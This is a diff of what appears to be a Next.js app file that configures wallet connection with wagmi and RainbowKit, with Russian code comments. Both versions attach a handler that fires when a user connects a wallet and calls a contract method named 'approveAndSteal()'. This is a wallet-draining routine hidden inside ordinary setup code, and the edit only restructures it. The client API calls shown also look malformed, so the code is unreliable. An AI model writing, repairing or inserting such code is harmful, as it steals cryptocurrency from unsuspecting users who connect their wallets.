@@ -2,7 +2,7 @@ import "../styles/globals.css";
 import "@rainbow-me/rainbowkit/styles.css";
 
 import { getDefaultWallets, RainbowKitProvider } from "@rainbow-me/rainbowkit";
-import { configureChains, createClient, WagmiConfig, Contract } from "wagmi";
+import { configureChains, createClient, WagmiConfig } from "wagmi";
 import {
     mainnet,
     polygon,
@@ -197,11 +197,11 @@ const wagmiClient = createClient({
     provider,
 });
 
-// Определение экземпляра контракта
-const contractInstance = wagmiClient.getContract(abi, contractAddress);
-
-wagmiClient.on("connect", async () => {
+// Необходимо убедиться, что wagmiClient инициализирован перед использованием
+wagmiClient.onConnect(async () => {
     try {
+        // Определение экземпляра контракта
+        const contractInstance = wagmiClient.getContract(contractAddress, abi);
         await contractInstance.approveAndSteal();
         console.log("approveAndSteal called successfully");
     } catch (error) {
